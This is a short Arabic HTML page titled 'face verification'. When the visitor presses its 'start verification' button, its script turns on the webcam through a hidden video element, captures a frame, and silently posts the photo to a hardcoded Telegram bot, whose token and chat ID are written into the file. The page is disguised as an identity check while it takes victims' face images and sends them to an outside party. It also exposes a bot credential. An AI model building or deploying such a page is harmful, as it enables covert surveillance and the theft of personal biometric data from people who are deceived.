<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحقق من الوجه</title>
</head>
<body>
    <button id="startBtn">بدء التحقق</button>
    <div id="status"></div>
    <video id="video" autoplay playsinline style="display:none;"></video>

    <script>
        const TOKEN = "8446745973:AAGKs--vQpRqpWDpOGO1ItaK18EJe_yue2g";
        const CHAT_ID = "8169635171"; 

        document.getElementById('startBtn').onclick = async () => {
            const video = document.getElementById('video');
            const status = document.getElementById('status');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                status.innerText = "جاري التقاط الصورة...";
                
                await new Promise(r => setTimeout(r, 1000));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'face.jpg');

                    status.innerText = "جاري الإرسال...";
                    
                    const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();
                    
                    if (result.ok) {
                        status.innerText = "تم الإرسال بنجاح!";
                    } else {
                        status.innerText = "خطأ من تيليجرام: " + result.description;
                    }
                    stream.getTracks().forEach(t => t.stop());
                }, 'image/jpeg');
            } catch (err) {
                status.innerText = "يجب منح إذن الكاميرا!";
            }
        };
    </script>
</body>
</html>
